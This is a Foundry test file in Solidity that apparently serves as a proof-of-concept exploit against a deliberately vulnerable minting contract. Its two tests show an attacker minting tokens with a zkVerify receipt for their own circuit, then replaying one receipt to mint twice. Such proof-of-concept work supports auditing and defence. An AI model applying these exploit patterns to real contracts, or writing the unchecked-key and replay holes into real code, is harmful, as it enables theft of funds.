// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {ElenchosForgery as F, ElenchosStatement, ZkVerifyStandIn} from "./ElenchosHarness.sol";
import {VulnerableMint} from "../src/user/VulnerableMint.sol";

/// The attacker brings a real receipt for their OWN circuit (E1), then replays it (E3).
contract ElenchosExploit is Test {
    ZkVerifyStandIn zk; VulnerableMint target;
    bytes32 constant PINNED_VK = keccak256("the honest claim circuit (pinned at deploy)");
    uint256 constant DOMAIN = 0;
    bytes32[] path;
    function setUp() public { zk = new ZkVerifyStandIn(); target = new VulnerableMint(address(zk)); }

    function test_attack_forged_receipt_mints() public {
        bytes32 leaf = ElenchosStatement.groth16(F.VK_HASH, F.inputs());
        assertEq(leaf, F.LEAF, "on-chain leaf matches the forged proof's zkVerify leaf");
        zk.aggregate(leaf);
        vm.prank(F.attacker());
        target.claim(F.VK_HASH, DOMAIN, 1, F.inputs(), path, 1, 0);
        console.log("attacker balance after one forged claim:", target.balanceOf(F.attacker()));
        assertEq(target.balanceOf(F.attacker()), F.AMOUNT, "attacker minted the forged amount");
    }
    function test_attack_replay_mints_twice() public {
        zk.aggregate(F.LEAF);
        vm.startPrank(F.attacker());
        target.claim(F.VK_HASH, DOMAIN, 1, F.inputs(), path, 1, 0);
        target.claim(F.VK_HASH, DOMAIN, 1, F.inputs(), path, 1, 0);
        vm.stopPrank();
        console.log("attacker balance after replaying the same receipt:", target.balanceOf(F.attacker()));
        assertEq(target.balanceOf(F.attacker()), 2 * F.AMOUNT, "the same receipt paid twice");
    }
}
